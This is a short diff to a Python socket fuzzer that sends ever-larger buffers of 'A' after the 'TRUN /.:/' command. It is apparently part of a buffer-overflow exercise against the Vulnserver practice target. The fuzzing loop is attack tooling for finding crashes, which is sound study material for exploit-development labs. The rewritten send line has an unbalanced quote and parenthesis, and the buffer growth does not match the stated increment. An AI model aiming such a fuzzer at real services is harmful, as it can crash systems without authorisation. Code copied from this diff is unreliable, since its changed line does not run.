@@ -4,7 +4,7 @@ import sys, socket as so, struct
 from time import sleep
 
 #setting the beginning buffer values and increment steps
-buffer = "A"
+buffer = "A"*100
 max_buffer = 10000
 increment = 200
 counter = 100
@@ -35,7 +35,8 @@ s = socketCreate()
 while len(buffer) < max_buffer:
     try:
         socketConnect(s, ip, port)
-        s.send(('TRUN /.:/' + buffer))
+        payload = "TRUN /.:/"+buffer
+        s.send(('payload.encode()))
         s.close()
         sleep(1)
         buffer = buffer + buffer*increment
